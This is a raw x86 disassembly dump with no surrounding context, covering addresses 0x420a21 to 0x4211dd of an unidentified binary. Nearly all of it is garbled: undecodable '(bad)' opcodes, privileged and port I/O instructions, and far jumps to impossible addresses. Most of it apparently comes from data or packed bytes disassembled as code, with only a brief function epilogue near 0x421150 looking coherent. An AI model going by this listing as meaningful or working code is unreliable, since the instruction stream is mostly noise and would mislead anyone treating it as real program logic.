  420a21:	push   0x4db03786
  420a26:	pop    esi
  420a27:	or     al,0xc
  420a29:	mov    edx,0x693a3675
  420a2e:	(bad)  
  420a2f:	ins    BYTE PTR es:[edi],dx
  420a30:	mov    ah,0x11
  420a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a34:	push   esp
  420a35:	cmp    BYTE PTR [edi*8+0x78e359ee],0x52
  420a3d:	cdq    
  420a3e:	pop    ecx
  420a3f:	or     al,dl
  420a41:	fsubr  QWORD PTR [edi]
  420a43:	mov    ds:0xe6941936,al
  420a48:	pop    ds
  420a49:	idiv   DWORD PTR [ebx]
  420a4b:	rcl    DWORD PTR [edi-0xdf9b45c],cl
  420a51:	pop    esp
  420a52:	add    DWORD PTR [edi-0x44d605c5],0x7bc3fbc7
  420a5c:	fwait
  420a5d:	adc    eax,0x8b926a1f
  420a62:	test   edi,0x62b13892
  420a68:	fbstp  TBYTE PTR ds:0xd6ccb48
  420a6e:	bound  ebx,QWORD PTR [edx-0x19]
  420a71:	fld    QWORD PTR [edi-0xc0b420e]
  420a77:	ret    
  420a78:	cwde   
  420a79:	arpl   sp,dx
  420a7b:	mov    bh,0x34
  420a7d:	test   al,0x48
  420a7f:	xchg   esi,eax
  420a80:	aaa    
  420a81:	adc    DWORD PTR [eax+0x4e816e13],edi
  420a87:	dec    esp
  420a88:	es cmp al,0x68
  420a8b:	mov    cl,BYTE PTR ds:0x488fbaa4
  420a91:	adc    al,ch
  420a93:	dec    eax
  420a94:	scas   al,BYTE PTR es:[edi]
  420a95:	imul   edx,DWORD PTR gs:[eax+0x58fed5d0],0x21
  420a9d:	fidiv  WORD PTR [eax]
  420a9f:	test   DWORD PTR [edi+0xab3ae2e],edx
  420aa5:	mov    BYTE PTR [ecx],dh
  420aa7:	scas   eax,DWORD PTR es:[edi]
  420aa8:	pop    ebx
  420aa9:	leave  
  420aaa:	(bad)  
  420aab:	cmp    cl,BYTE PTR [eax-0x48]
  420aae:	push   es
  420aaf:	cmp    BYTE PTR [ecx+0x38b3c917],0xa0
  420ab6:	int    0x34
  420ab8:	xchg   DWORD PTR [edi-0x23],ebx
  420abb:	sbb    dh,BYTE PTR [edi]
  420abd:	xor    al,0x2e
  420abf:	sub    al,BYTE PTR [edx]
  420ac1:	pop    ss
  420ac2:	bnd jl 0x420a4d
  420ac5:	bound  eax,QWORD PTR [esi+ebx*1-0x5c]
  420ac9:	push   es
  420aca:	mov    dh,0x65
  420acc:	push   ebp
  420acd:	stos   BYTE PTR es:[edi],al
  420ace:	daa    
  420acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ad0:	mov    ebx,0x293a0f6d
  420ad5:	pusha  
  420ad6:	jns    0x420b4a
  420ad8:	push   esi
  420ad9:	scas   al,BYTE PTR es:[edi]
  420ada:	int3   
  420adb:	jecxz  0x420ac1
  420add:	pop    edi
  420ade:	adc    esi,ebp
  420ae0:	sbb    BYTE PTR [esi+edi*2+0x20],bh
  420ae4:	adc    ecx,edi
  420ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ae7:	test   BYTE PTR [edx+0x3830fa57],bh
  420aed:	sti    
  420aee:	arpl   WORD PTR [ecx-0x18],di
  420af1:	inc    edx
  420af2:	dec    eax
  420af3:	add    BYTE PTR [edx+0x5d],cl
  420af6:	loopne 0x420a88
  420af8:	ss pop eax
  420afa:	and    DWORD PTR [eax+eiz*2-0x11],0xffffffce
  420aff:	sbb    eax,0x754d470
  420b04:	mov    eax,ds:0x227d84d9
  420b09:	mov    ds,WORD PTR [edi]
  420b0b:	and    DWORD PTR [edx-0x5a540a21],edi
  420b11:	xor    ch,al
  420b13:	sar    bl,cl
  420b15:	mov    ebx,0xdd7a4275
  420b1a:	dec    esp
  420b1b:	lea    esi,[ecx+0x70]
  420b1e:	inc    eax
  420b1f:	cs jge 0x420b20
  420b22:	xor    al,0xec
  420b24:	add    ch,BYTE PTR [edi]
  420b26:	and    DWORD PTR [edx+0x89ef981],esp
  420b2c:	in     al,0x13
  420b2e:	sti    
  420b2f:	sti    
  420b30:	jmp    0x420baa
  420b32:	mov    bl,0x1d
  420b34:	adc    ecx,DWORD PTR [edi]
  420b36:	sti    
  420b37:	push   0xffffffa2
  420b39:	outs   dx,BYTE PTR ds:[esi]
  420b3a:	imul   eax,DWORD PTR [ebx],0x38a13d27
  420b40:	in     eax,0xc5
  420b42:	int3   
  420b43:	mov    dl,0xaa
  420b45:	stc    
  420b46:	into   
  420b47:	data16 adc bl,dh
  420b4a:	inc    ebx
  420b4b:	xchg   ebp,eax
  420b4c:	sub    DWORD PTR [eax-0x2209830f],ecx
  420b52:	ins    DWORD PTR es:[edi],dx
  420b53:	inc    ebx
  420b54:	in     eax,dx
  420b55:	jge    0x420b3c
  420b57:	test   eax,0x55feea75
  420b5c:	cdq    
  420b5d:	ja     0x420b31
  420b5f:	(bad)  
  420b60:	out    0x69,eax
  420b62:	sbb    al,0xde
  420b64:	mov    ecx,0xbdecd868
  420b69:	sbb    eax,0x9d024379
  420b6e:	in     eax,dx
  420b6f:	cmc    
  420b70:	(bad)  
  420b71:	push   edx
  420b72:	dec    eax
  420b73:	jle    0x420b3c
  420b75:	cmp    dh,al
  420b77:	jb     0x420b3c
  420b79:	pop    ebx
  420b7a:	mov    edi,0xcdf29e55
  420b7f:	pop    edx
  420b80:	or     esp,ebx
  420b82:	cwde   
  420b83:	push   0x268e76e5
  420b88:	addr16 pop ds
  420b8a:	popf   
  420b8b:	mov    dh,0x7a
  420b8d:	lods   al,BYTE PTR ds:[esi]
  420b8f:	and    dl,BYTE PTR [ebx+0x60c3a26c]
  420b95:	inc    edx
  420b96:	mov    eax,0x5c015566
  420b9b:	sbb    esp,DWORD PTR [ebx-0xc]
  420b9e:	call   0x468b:0xac78039d
  420ba5:	xchg   edx,eax
  420ba6:	mov    ebp,DWORD PTR [ebp-0x27]
  420ba9:	out    dx,al
  420baa:	(bad)  
  420bac:	test   eax,0xf20431d6
  420bb1:	dec    eax
  420bb2:	daa    
  420bb3:	dec    edx
  420bb4:	sbb    edx,DWORD PTR [ecx+0x34e3120]
  420bba:	out    dx,al
  420bbb:	shufps xmm1,XMMWORD PTR [ebx-0xd],0x76
  420bc0:	mov    esi,0x5fe6eeaa
  420bc5:	inc    ebx
  420bc6:	push   edi
  420bc7:	scas   eax,DWORD PTR es:[edi]
  420bc8:	mov    ebx,0xf450d707
  420bcd:	inc    edi
  420bce:	or     ch,dh
  420bd0:	xlat   BYTE PTR ds:[ebx]
  420bd1:	mov    eax,0xf37dba02
  420bd6:	pop    edx
  420bd7:	or     ch,BYTE PTR [ecx-0x2081a9b8]
  420bdd:	xor    al,0xf6
  420bdf:	stos   DWORD PTR es:[edi],eax
  420be0:	xor    DWORD PTR [ebp-0x23],edi
  420be3:	stos   DWORD PTR es:[edi],eax
  420be4:	aad    0x35
  420be6:	and    bl,BYTE PTR [esi-0x37]
  420be9:	(bad)  
  420beb:	jl     0x420b81
  420bed:	xor    DWORD PTR [esi+0x8],ebx
  420bf0:	aam    0xd5
  420bf2:	mov    ebx,0x804c7a2b
  420bf7:	fdiv   st(4),st
  420bf9:	inc    ebx
  420bfa:	(bad)  
  420bfb:	jge    0x420bec
  420bfd:	inc    ebx
  420bfe:	mov    bh,bh
  420c00:	clc    
  420c01:	sbb    DWORD PTR [edx-0x39],ebp
  420c04:	mov    ds:0xb6dd1e31,eax
  420c09:	mov    eax,db3
  420c0c:	add    eax,0x34aa7e3c
  420c11:	pop    esp
  420c12:	into   
  420c13:	push   ss
  420c14:	test   eax,0xfeeed2f1
  420c19:	push   esi
  420c1a:	adc    esp,DWORD PTR [edx]
  420c1c:	cmp    al,0xf
  420c1e:	mov    eax,ds:0x91de3926
  420c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c24:	jle    0x420bd7
  420c26:	add    edi,DWORD PTR [edx]
  420c28:	add    ebp,DWORD PTR [esp+ebx*2]
  420c2b:	mov    ds:0x827511b6,eax
  420c31:	and    dh,bl
  420c33:	and    DWORD PTR [eiz*4+0x73151ed1],ebp
  420c3a:	mov    edi,0x381b5fa4
  420c3f:	adc    eax,0xfee2be2d
  420c44:	(bad)  
  420c46:	out    0x16,al
  420c48:	xor    DWORD PTR [eax+0x35],esp
  420c4b:	mov    ch,BYTE PTR [edx-0x5044afb1]
  420c51:	jmp    0xf46ac29d
  420c56:	dec    edx
  420c57:	int    0x12
  420c59:	in     al,0x5f
  420c5b:	jno    0x420cc3
  420c5d:	jb     0x420beb
  420c5f:	fimul  WORD PTR [edx]
  420c61:	inc    esp
  420c62:	lods   al,BYTE PTR ds:[esi]
  420c63:	jmp    0xa53ce92d
  420c68:	sub    DWORD PTR [ecx-0x4e],ecx
  420c6b:	jmp    0x4ea1:0xafc1ff06
  420c72:	sub    DWORD PTR [eax+0x7e19eae2],edi
  420c78:	iret   
  420c79:	mov    al,ds:0x512ab242
  420c7e:	add    DWORD PTR [edx-0x44],0xb9174e3f
  420c85:	stc    
  420c86:	sub    DWORD PTR [edi+0x36],edi
  420c89:	pop    eax
  420c8a:	jns    0x420c78
  420c8c:	pop    ebp
  420c8d:	aas    
  420c8e:	and    DWORD PTR [ebp+0x70],0xffffffa5
  420c92:	xor    al,dl
  420c94:	cmc    
  420c95:	and    DWORD PTR [ebx-0x5f],eax
  420c98:	ins    BYTE PTR es:[edi],dx
  420c99:	mov    bh,0xb1
  420c9b:	jle    0x420d01
  420c9d:	and    DWORD PTR [eax],ecx
  420c9f:	inc    edi
  420ca0:	pop    esp
  420ca1:	add    edx,DWORD PTR [esi]
  420ca3:	add    eax,0x50c14c5c
  420ca8:	pop    ds
  420ca9:	lock dec esp
  420cab:	js     0x420d07
  420cad:	mov    WORD PTR [eax+0x60],ds
  420cb0:	shl    DWORD PTR [esi-0x56e68484],cl
  420cb6:	inc    esi
  420cb7:	xchg   ecx,eax
  420cb8:	int    0xd9
  420cba:	pop    ecx
  420cbb:	std    
  420cbc:	or     edx,DWORD PTR [ecx]
  420cbe:	adc    al,0xe
  420cc1:	sub    edi,ebp
  420cc3:	mov    edx,0xb6874c9a
  420cc8:	ficomp DWORD PTR [ecx]
  420cca:	jp     0x420cb1
  420ccc:	mov    eax,0x89d8fd03
  420cd1:	pop    ebx
  420cd2:	std    
  420cd3:	das    
  420cd4:	cmc    
  420cd5:	sub    BYTE PTR ds:0x70fc57fe,bl
  420cdb:	adc    ah,BYTE PTR [esi]
  420cdd:	adc    edi,DWORD PTR [edx+ecx*8-0xf]
  420ce1:	sti    
  420ce2:	not    dh
  420ce4:	ret    
  420ce5:	pop    edi
  420ce6:	mov    al,ds:0x3464d2e2
  420ceb:	imul   esp,DWORD PTR [eax+0x65],0xffffffb5
  420cef:	gs pushf 
  420cf1:	xor    eax,0xfb6fe17d
  420cf6:	pop    ds
  420cf7:	fidivr DWORD PTR ds:[ebx-0x575ff240]
  420cfe:	mov    BYTE PTR [esi*1-0x12330ccd],cl
  420d05:	push   ebp
  420d06:	outs   dx,BYTE PTR ds:[esi]
  420d07:	xlat   BYTE PTR ds:[ebx]
  420d08:	imul   DWORD PTR [esi-0xc]
  420d0b:	test   al,0xc5
  420d0d:	and    al,0x62
  420d10:	jmp    0xbe9f:0x6f880732
  420d17:	sub    ah,BYTE PTR [edi]
  420d19:	scas   eax,DWORD PTR es:[edi]
  420d1a:	(bad)  
  420d1b:	cmc    
  420d1c:	push   edi
  420d1d:	stos   BYTE PTR es:[edi],al
  420d1e:	ins    DWORD PTR es:[edi],dx
  420d1f:	jl     0x420cba
  420d21:	xchg   DWORD PTR [esi+0x6bb9db21],ecx
  420d27:	test   BYTE PTR [eax-0x289de605],al
  420d2d:	jle    0x420d91
  420d2f:	sub    ch,al
  420d31:	push   edi
  420d32:	mov    BYTE PTR [esi-0x32],dh
  420d35:	pop    edx
  420d36:	and    al,0xf6
  420d38:	ins    BYTE PTR es:[edi],dx
  420d39:	or     edi,DWORD PTR [ebx+0x60675d14]
  420d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d40:	dec    ax
  420d42:	cmp    al,BYTE PTR [ebx-0xe106597]
  420d48:	mov    cl,0x2d
  420d4a:	aas    
  420d4b:	push   edx
  420d4c:	mov    esi,0xd6520816
  420d51:	dec    ebp
  420d52:	inc    edi
  420d53:	mov    DWORD PTR [edx-0x4],ebx
  420d56:	push   ebx
  420d57:	popa   
  420d58:	cmp    BYTE PTR [esi+ebx*1+0x6e],ah
  420d5c:	xlat   BYTE PTR ds:[ebx]
  420d5d:	add    al,0xa9
  420d5f:	jl     0x420db7
  420d61:	jmp    0x2d0ea578
  420d66:	or     edx,DWORD PTR [esi+0x742b33fc]
  420d6c:	mov    edx,0xb9310788
  420d71:	xor    dh,dh
  420d73:	push   es
  420d74:	jno    0x420d5e
  420d76:	push   0x13
  420d78:	sbb    ebp,DWORD PTR [ecx+edi*1-0x40]
  420d7c:	mov    ah,0xd7
  420d7e:	pop    ds
  420d7f:	mov    ds:0x6b67ef55,al
  420d84:	out    0x0,eax
  420d86:	add    eax,0x77bfc04f
  420d8b:	or     ah,cl
  420d8d:	mov    ebx,ebp
  420d8f:	mov    edi,0xb3c58bf6
  420d94:	ja     0x420d50
  420d96:	mov    al,ds:0x45b2c4e2
  420d9b:	icebp  
  420d9c:	aad    0x8f
  420d9e:	gs into 
  420da0:	sbb    DWORD PTR [esi],esp
  420da2:	inc    esp
  420da3:	and    cl,BYTE PTR [ebx+0x64]
  420da6:	aaa    
  420da7:	xor    BYTE PTR [eax+eax*4-0x2d],cl
  420dab:	(bad)  
  420dac:	cli    
  420dad:	dec    ebp
  420dae:	sahf   
  420daf:	mov    ebp,0x9e78291f
  420db4:	and    edx,DWORD PTR ds:0x218c5ee9
  420dba:	mov    dh,0x80
  420dbc:	mov    dh,0x9e
  420dbe:	adc    ecx,DWORD PTR [ecx-0x6bcb8823]
  420dc4:	sbb    ebp,ebp
  420dc6:	mov    cl,BYTE PTR [ebp+0x1ebc6639]
  420dcc:	mov    al,BYTE PTR [ecx-0x37e76efe]
  420dd2:	push   ebp
  420dd3:	arpl   WORD PTR [edx-0x4423610f],sp
  420dd9:	in     eax,0x14
  420ddb:	push   ds
  420ddc:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  420dde:	push   cs
  420ddf:	mov    ds:0x932d0d59,al
  420de4:	and    eax,0x1f903763
  420de9:	lods   eax,DWORD PTR ds:[esi]
  420dea:	sbb    BYTE PTR [edi],0x9e
  420ded:	clc    
  420dee:	inc    edx
  420def:	jg     0x420d7a
  420df1:	stos   BYTE PTR es:[edi],al
  420df2:	sub    dh,BYTE PTR [ebx+0x79a2f71c]
  420df8:	in     eax,0x34
  420dfa:	push   esp
  420dfb:	(bad)  
  420dfc:	sub    BYTE PTR [ecx+0x7a2dcf7d],ah
  420e02:	int3   
  420e03:	(bad)  
  420e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e05:	les    ebx,FWORD PTR [eax-0x7d8257b]
  420e0b:	std    
  420e0c:	pop    ebp
  420e0d:	sbb    BYTE PTR [ebx+0x62],bh
  420e10:	inc    ecx
  420e11:	sar    BYTE PTR [esi+0x6f1063f8],1
  420e17:	frstor [ebp+0x47fac081]
  420e1d:	mov    esp,0x73c418ff
  420e22:	dec    edi
  420e23:	mov    esp,0x5363cc41
  420e28:	sub    edx,DWORD PTR [edi]
  420e2a:	loope  0x420e94
  420e2c:	sbb    DWORD PTR [ecx-0x30],0xc9be6c02
  420e33:	mov    dl,0xb2
  420e35:	and    edx,ebp
  420e37:	(bad)  
  420e39:	test   BYTE PTR [edx],ah
  420e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e3c:	push   0xffffff93
  420e3e:	fld    DWORD PTR [edi]
  420e40:	lock push 0x9
  420e43:	xchg   edi,eax
  420e44:	push   ss
  420e45:	jmp    0x420e18
  420e47:	(bad)  
  420e48:	hlt    
  420e49:	shl    ah,0xee
  420e4c:	jbe    0x420ec3
  420e4e:	jecxz  0x420de2
  420e50:	xchg   ebx,eax
  420e51:	sbb    bl,cl
  420e53:	sbb    eax,0x7eec92a4
  420e58:	mov    dh,BYTE PTR [ecx-0x62cc204d]
  420e5e:	cmp    BYTE PTR [ecx+ecx*2],0xfd
  420e62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e63:	cwde   
  420e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e65:	jge    0x420ed0
  420e67:	fidiv  DWORD PTR [ecx+0x37a29065]
  420e6d:	dec    edx
  420e6e:	stc    
  420e6f:	mov    BYTE PTR [edx-0x2f],dh
  420e72:	sbb    esi,DWORD PTR [ebx]
  420e74:	mov    ds,WORD PTR [edx]
  420e76:	dec    esi
  420e77:	add    al,bh
  420e79:	fimul  WORD PTR [eiz*2-0x5ccd50a8]
  420e80:	cs adc al,0x1d
  420e83:	mov    bh,0x22
  420e85:	in     eax,dx
  420e86:	mov    bh,0x4b
  420e88:	jns    0x420e89
  420e8a:	lea    esp,[ebx+ebp*2+0x54e9c0f1]
  420e91:	cmp    DWORD PTR [esi-0x445f0d87],0x6f
  420e98:	aas    
  420e99:	ins    BYTE PTR es:[edi],dx
  420e9a:	cdq    
  420e9b:	ds dec esi
  420e9d:	loop   0x420e81
  420e9f:	push   edx
  420ea0:	mov    al,ds:0x6ded5fbe
  420ea5:	in     al,dx
  420ea6:	adc    BYTE PTR [edx],0x88
  420ea9:	mov    ecx,0x34ab20ab
  420eae:	mov    al,0xe4
  420eb0:	(bad)  [edx-0x2a]
  420eb3:	(bad)  
  420eb4:	push   cs
  420eb5:	lahf   
  420eb6:	rcr    BYTE PTR [edx+0x54],0x0
  420eba:	sbb    BYTE PTR [edx],dl
  420ebc:	jmp    0x420e82
  420ebe:	scas   eax,DWORD PTR es:[edi]
  420ebf:	imul   ecx,DWORD PTR [ebp-0x47],0x6de6c7db
  420ec6:	shl    DWORD PTR [ebx-0x2b],1
  420ec9:	pop    edi
  420eca:	test   al,0xcb
  420ecc:	adc    DWORD PTR [eax-0x7f76ba84],esp
  420ed2:	jl     0x420ee0
  420ed4:	aaa    
  420ed5:	sub    eax,eax
  420ed7:	(bad)  
  420ed8:	repz je 0x420ed5
  420edb:	mov    es,ecx
  420edd:	adc    ebp,esi
  420edf:	xchg   ebx,eax
  420ee0:	pusha  
  420ee1:	lods   al,BYTE PTR ds:[esi]
  420ee2:	dec    esp
  420ee3:	stos   BYTE PTR es:[edi],al
  420ee4:	mov    DWORD PTR [eax],ebp
  420ee6:	aad    0x59
  420ee8:	or     ebp,ebx
  420eea:	xor    esp,edi
  420eec:	dec    ebx
  420eed:	adc    edi,DWORD PTR [edx+0x6ba68358]
  420ef3:	pop    ss
  420ef4:	lea    edi,[ecx]
  420ef6:	sbb    al,0xf2
  420ef8:	mov    ebx,DWORD PTR [edx]
  420efa:	aaa    
  420efb:	sbb    al,0xbb
  420efd:	mov    sp,0x125f
  420f01:	loopne 0x420ece
  420f03:	xor    ebx,0x8266fa23
  420f09:	hlt    
  420f0a:	fsub   QWORD PTR [ecx]
  420f0c:	xchg   edi,eax
  420f0d:	cld    
  420f0e:	mov    edi,0x852a6650
  420f13:	loop   0x420e95
  420f15:	(bad)
  420f18:	pop    ss
  420f19:	xchg   esp,eax
  420f1a:	and    DWORD PTR [ecx],esp
  420f1c:	mov    esp,0xf73b335c
  420f21:	push   0x674f0112
  420f26:	adc    edi,DWORD PTR [ebx]
  420f28:	jno    0x420eb8
  420f2a:	push   esi
  420f2b:	cwde   
  420f2c:	push   DWORD PTR [eax+0x18]
  420f2f:	test   BYTE PTR [ecx-0x70],ch
  420f32:	xchg   ebp,eax
  420f33:	inc    esi
  420f34:	fbld   TBYTE PTR [ecx+0x13]
  420f37:	jmp    0x420f50
  420f39:	call   DWORD PTR [eax+eiz*8+0x3d87e9e5]
  420f40:	fucomip st,st(2)
  420f42:	inc    ebp
  420f43:	out    dx,al
  420f44:	sub    eax,0x2df75d13
  420f49:	data16 ins BYTE PTR es:[edi],dx
  420f4b:	les    edi,FWORD PTR [ebx+0x6502364a]
  420f51:	mov    ch,0x3e
  420f53:	push   ss
  420f54:	jmp    0x6f0e:0xd222abeb
  420f5b:	mov    eax,ds:0xd9b78a20
  420f60:	cmp    ebp,DWORD PTR [eax]
  420f62:	outs   dx,BYTE PTR ds:[esi]
  420f63:	and    DWORD PTR [ecx-0x3a],edi
  420f66:	sub    ah,BYTE PTR [edx]
  420f68:	sysenter 
  420f6a:	jnp    0x420f65
  420f6c:	loop   0x420fe0
  420f6e:	jl     0x420fd2
  420f70:	xor    al,BYTE PTR [eax-0x34b37240]
  420f76:	push   ds
  420f77:	loope  0x420fdd
  420f79:	dec    ecx
  420f7a:	loope  0x420fa4
  420f7c:	inc    esi
  420f7d:	outs   dx,DWORD PTR ds:[esi]
  420f7e:	push   esp
  420f7f:	xor    eax,0x5590cc17
  420f84:	jns    0x420fd6
  420f86:	fnsave [ebx+0x4b079686]
  420f8c:	add    ecx,DWORD PTR [eax-0x54]
  420f8f:	push   eax
  420f90:	push   ebx
  420f91:	imul   ebp,DWORD PTR [edi],0x9
  420f94:	popf   
  420f95:	inc    esp
  420f96:	push   cs
  420f97:	jg     0x420fec
  420f99:	sbb    edi,0x424236b4
  420f9f:	cld    
  420fa0:	div    DWORD PTR [esi-0x27840cd6]
  420fa6:	lods   eax,DWORD PTR ds:[esi]
  420fa7:	sbb    DWORD PTR [edx-0x1a],esp
  420faa:	int    0xe3
  420fac:	inc    esp
  420fad:	mov    dh,dh
  420faf:	daa    
  420fb0:	jns    0x420ffc
  420fb2:	sbb    eax,0xab368e14
  420fb7:	pop    ds
  420fb8:	xchg   ebp,eax
  420fb9:	ret    0x73da
  420fbc:	ins    BYTE PTR es:[edi],dx
  420fbd:	xchg   ebx,eax
  420fbe:	mov    cl,0xd5
  420fc0:	mov    edi,0xdd999913
  420fc5:	fisttp QWORD PTR [ecx]
  420fc7:	inc    esp
  420fc8:	mov    eax,ds:0x679ff098
  420fcd:	outs   dx,DWORD PTR ds:[esi]
  420fce:	inc    edi
  420fcf:	xor    eax,0x2cdf5144
  420fd4:	xchg   esi,eax
  420fd5:	pop    bx
  420fd7:	mov    ecx,0x233f8679
  420fdc:	push   eax
  420fdd:	out    dx,eax
  420fde:	and    DWORD PTR [eax],esi
  420fe0:	imul   edi,edx,0x0
  420fe3:	loop   0x421064
  420fe5:	in     al,0xb2
  420fe7:	aaa    
  420fe8:	loop   0x421010
  420fea:	rcr    BYTE PTR [ebx+0x19ac0605],1
  420ff0:	mov    bl,dh
  420ff2:	jmp    0x420fdb
  420ff4:	jmp    0x4d4d32ef
  420ff9:	fisttp DWORD PTR [edx]
  420ffb:	aad    0xf
  420ffd:	mov    ch,0xed
  420fff:	mul    BYTE PTR [esi]
  421001:	mov    ah,0xd
  421003:	jns    0x42100b
  421005:	call   0x10c2:0x7d41b716
  42100c:	arpl   WORD PTR [ebp-0x48],dx
  42100f:	cmp    DWORD PTR [ecx],edi
  421011:	cli    
  421012:	adc    DWORD PTR [ecx+0x6a1cfd82],eax
  421018:	mov    ah,0x79
  42101a:	int    0xd8
  42101c:	sub    esp,DWORD PTR [edx]
  42101e:	test   eax,0x9f681e44
  421023:	mov    eax,ds:0xa3a503e3
  421028:	jp     0x421050
  42102a:	and    al,BYTE PTR [ecx+0x9b6e715]
  421030:	push   ecx
  421031:	dec    edx
  421032:	call   0xebfef395
  421037:	cmp    dh,BYTE PTR [ebp-0x144ff870]
  42103d:	shl    DWORD PTR [ebp+0x21a45cd6],0xfa
  421044:	loop   0x421046
  421046:	push   esi
  421047:	jae    0x421047
  421049:	wrmsr  
  42104b:	test   al,0x63
  42104d:	enter  0xa24,0xa7
  421051:	mov    al,0x4b
  421053:	repnz xor esi,eax
  421056:	add    BYTE PTR [edi],dl
  421058:	mov    dl,0xbf
  42105a:	add    DWORD PTR [ebx],ebx
  42105c:	adc    cl,BYTE PTR [ecx-0x53]
  42105f:	add    al,0xec
  421061:	out    0xd2,al
  421063:	nop
  421064:	mov    esp,0xfa09cfb6
  421069:	pushf  
  42106a:	and    eax,0x8fd75e26
  42106f:	push   DWORD PTR [edx-0x227542a0]
  421075:	xor    al,0xa7
  421077:	rcl    al,1
  421079:	dec    ebx
  42107a:	ror    DWORD PTR [esi-0x4],1
  42107d:	inc    eax
  42107e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42107f:	(bad)  
  421080:	or     dh,ch
  421082:	int    0xc4
  421084:	cs (bad) 
  421086:	or     eax,DWORD PTR [edx+eiz*4]
  421089:	jne    0x421024
  42108b:	mov    DWORD PTR [edx-0x67],ebp
  42108e:	ret    
  42108f:	push   edx
  421090:	outs   dx,DWORD PTR ds:[esi]
  421091:	jo     0x421102
  421093:	mov    WORD PTR [ecx-0x33],ds
  421096:	fst    DWORD PTR [ebp-0x24]
  421099:	mov    ebp,0xcf61ea89
  42109e:	nop
  42109f:	pop    edx
  4210a0:	mov    WORD PTR [edx+0x10ea4552],ss
  4210a6:	xchg   ebp,eax
  4210a7:	mov    ds:0x98d30a1b,eax
  4210ac:	jmp    0xe4c0a36d
  4210b1:	xor    eax,0x6556c323
  4210b6:	mov    DWORD PTR [ebx+0x1e],esi
  4210b9:	sub    esp,DWORD PTR ds:0x5d12783b
  4210bf:	mov    ebx,0xd562301f
  4210c4:	pop    ss
  4210c5:	cwde   
  4210c6:	sub    DWORD PTR [esi],0x1d874197
  4210cc:	(bad)  
  4210cd:	es jge 0x421107
  4210d0:	push   esp
  4210d1:	xor    BYTE PTR [eax+0x31],cl
  4210d4:	rol    DWORD PTR [esi],cl
  4210d6:	sub    BYTE PTR [edx-0x4e],dh
  4210d9:	rcr    BYTE PTR [ebx+ebp*4],0x79
  4210dd:	fcom   DWORD PTR [ebp+0x4a]
  4210e0:	(bad)  
  4210e1:	mov    DWORD PTR [ebp+0x5848e8ee],esi
  4210e7:	dec    esp
  4210e8:	dec    edi
  4210e9:	fst    DWORD PTR [eax+0x3e]
  4210ec:	lds    edi,FWORD PTR [edx-0x104caef9]
  4210f2:	cmp    ecx,DWORD PTR [ecx]
  4210f4:	adc    bl,0x79
  4210f7:	sub    ebp,DWORD PTR [edi+0x58]
  4210fa:	adc    dh,0xc
  4210fd:	cwde   
  4210fe:	jbe    0x4210f6
  421100:	packsswb mm3,QWORD PTR [eax+0x65]
  421104:	push   ds
  421105:	lds    ecx,FWORD PTR [eax]
  421107:	mov    ah,BYTE PTR [edx-0x511aed6d]
  42110d:	(bad)  
  42110e:	adc    al,0x3f
  421110:	inc    esp
  421111:	out    dx,al
  421112:	les    ebp,FWORD PTR [esi+ebx*1-0x43]
  421116:	xor    BYTE PTR [ebp-0x33],0x7e
  42111a:	ds and esp,esi
  42111d:	dec    edx
  42111e:	imul   esi,DWORD PTR [edx+0x27d50c3c],0xa56697fa
  421128:	(bad)  
  421129:	cmp    BYTE PTR [ebp+ebp*2+0x24],ch
  42112d:	jmp    0xa1543ce2
  421132:	call   0x89d7:0x3398bcb
  421139:	adc    DWORD PTR [ebx-0x37ccf7b3],ecx
  42113f:	add    ecx,esi
  421141:	jne    0x41ed92
  421147:	mov    ecx,DWORD PTR [ebp-0x8]
  42114a:	xor    ecx,eax
  42114c:	mov    eax,DWORD PTR [ebp+0x10]
  42114f:	add    ecx,esi
  421151:	mov    DWORD PTR [eax],ecx
  421153:	pop    edi
  421154:	pop    esi
  421155:	pop    ebx
  421156:	leave  
  421157:	ret    0xc
  42115a:	pop    ss
  42115b:	or     al,0x84
  42115d:	repz lahf 
  42115f:	sti    
  421160:	ja     0x42114e
  421162:	stos   BYTE PTR es:[edi],al
  421163:	mov    edx,0x191d88e2
  421168:	sahf   
  421169:	push   edi
  42116a:	cmp    eax,0x610001cc
  42116f:	add    BYTE PTR [eax],al
  421171:	add    BYTE PTR [edx+0x248ddb82],bh
  421177:	push   ebx
  421178:	jge    0x4211d4
  42117a:	outs   dx,DWORD PTR ds:[esi]
  42117b:	sbb    DWORD PTR [eax],esp
  42117d:	dec    ebp
  42117e:	mul    DWORD PTR [edx-0x1ca23a41]
  421184:	dec    eax
  421185:	rcr    DWORD PTR [edi-0x6a569442],1
  42118b:	rcr    BYTE PTR [edx-0x63],cl
  42118e:	out    dx,eax
  42118f:	xchg   DWORD PTR [ecx+0x6bbd81d2],esp
  421195:	xor    BYTE PTR [edx],ch
  421197:	repnz add BYTE PTR [eax],ch
  42119a:	add    DWORD PTR [eax-0x31],ebp
  42119d:	in     al,dx
  42119e:	ss xchg esp,eax
  4211a0:	les    esp,FWORD PTR [edx+0x1e09aa02]
  4211a6:	in     al,0x9e
  4211a8:	fimul  WORD PTR [esi]
  4211aa:	int3   
  4211ab:	pop    es
  4211ac:	in     eax,0x91
  4211ae:	fimul  DWORD PTR [ecx]
  4211b0:	retf   0xf28b
  4211b3:	pusha  
  4211b4:	xchg   ebp,eax
  4211b5:	jmp    0x421186
  4211b7:	sti    
  4211b8:	jmp    0x4211c5
  4211ba:	ins    BYTE PTR es:[edi],dx
  4211bb:	rcr    BYTE PTR [eax-0x6d],cl
  4211be:	sbb    al,BYTE PTR [edx-0x43]
  4211c1:	addr16 cmc 
  4211c3:	fwait
  4211c4:	cld    
  4211c5:	or     ecx,DWORD PTR [edx+0x2f]
  4211c8:	mov    cl,0x1c
  4211ca:	dec    ebx
  4211cb:	pop    ds
  4211cc:	shl    BYTE PTR [ebp-0x57],0x12
  4211d0:	cmp    al,0x1b
  4211d2:	add    eax,0x0
  4211d7:	add    BYTE PTR [eax],al
  4211d9:	add    cl,dl
  4211db:	sub    al,0x14
